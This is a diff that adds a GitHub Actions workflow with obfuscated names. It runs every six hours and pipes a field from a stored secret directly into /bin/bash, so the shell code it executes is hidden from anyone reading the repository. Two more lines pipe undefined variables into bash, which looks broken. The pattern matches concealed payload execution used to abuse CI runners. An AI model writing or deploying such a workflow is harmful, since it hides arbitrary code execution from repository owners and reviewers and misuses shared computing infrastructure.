@@ -1,0 +1,19 @@
+name: duanyuhe3377
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanyuhe3377
+        env:
+          nw71296: ${{ secrets.nw71296 }}
+        run: |
+          echo $nw71296 | jq -r .lybl1666 | /bin/bash
+          echo $zqvnk3997 | jq -r .ov1 | /bin/bash
+          echo $a729 | jq -r .gbvh73 | /bin/bash
+
